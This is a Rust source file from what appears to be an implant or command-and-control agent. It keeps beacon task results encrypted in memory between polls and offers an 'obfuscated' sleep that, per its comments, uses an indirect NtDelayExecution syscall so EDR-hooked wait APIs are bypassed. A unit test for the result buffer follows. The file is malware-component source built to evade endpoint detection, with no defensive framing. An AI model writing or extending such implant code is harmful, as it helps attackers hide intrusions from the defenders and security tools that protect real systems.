//! Implant-side sleep and memory hygiene helpers.
//!
//! Pending task results are kept sealed in memory between polls and the beacon
//! sleep prefers an indirect `NtDelayExecution` call on Windows so wait APIs
//! hooked by EDRs are not traversed.

use prost::Message;
use shikra_evasion::MaskedBytes;
use shikra_proto::v1::{AgentResult, AgentResultBatch};
use std::time::Duration;

/// Pending beacon results kept encrypted at rest.
#[derive(Default)]
pub struct MaskedResults {
    sealed: Option<MaskedBytes>,
}

impl MaskedResults {
    pub fn new() -> Self {
        Self { sealed: None }
    }

    pub fn is_empty(&self) -> bool {
        self.sealed.as_ref().is_none_or(MaskedBytes::is_empty)
    }

    pub fn push(&mut self, result: AgentResult) {
        let mut results = self.open_results();
        results.push(result);
        let batch = AgentResultBatch { results };
        self.sealed = Some(MaskedBytes::new(&batch.encode_to_vec()));
    }

    /// Decodes and clears the batch, leaving no plaintext behind.
    pub fn take_batch(&mut self) -> Option<AgentResultBatch> {
        if self.is_empty() {
            return None;
        }
        let results = self.open_results();
        self.sealed = None;
        Some(AgentResultBatch { results })
    }

    fn open_results(&self) -> Vec<AgentResult> {
        let Some(sealed) = &self.sealed else {
            return Vec::new();
        };
        match sealed.open() {
            Ok(bytes) if !bytes.is_empty() => AgentResultBatch::decode(bytes.as_slice())
                .map(|batch| batch.results)
                .unwrap_or_default(),
            _ => Vec::new(),
        }
    }
}

/// Sleeps for `duration`, preferring a syscall sleep on Windows.
pub async fn sleep_obfuscated(duration: Duration) {
    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        if shikra_evasion::windows::available() {
            let _ = tokio::task::spawn_blocking(move || {
                shikra_evasion::sleep::sleep(duration);
            })
            .await;
            return;
        }
    }
    tokio::time::sleep(duration).await;
}

#[cfg(test)]
mod tests {
    use super::*;

    fn result(task: &str) -> AgentResult {
        AgentResult {
            task_id: task.into(),
            exit_code: 0,
            stdout: b"output".to_vec(),
            stderr: Vec::new(),
        }
    }

    #[test]
    fn masked_results_roundtrip() {
        let mut masked = MaskedResults::new();
        assert!(masked.is_empty());
        masked.push(result("t1"));
        masked.push(result("t2"));
        assert!(!masked.is_empty());
        let batch = masked.take_batch().expect("batch");
        assert_eq!(batch.results.len(), 2);
        assert_eq!(batch.results[0].task_id, "t1");
        assert_eq!(batch.results[1].task_id, "t2");
        assert!(masked.is_empty());
        assert!(masked.take_batch().is_none());
    }
}
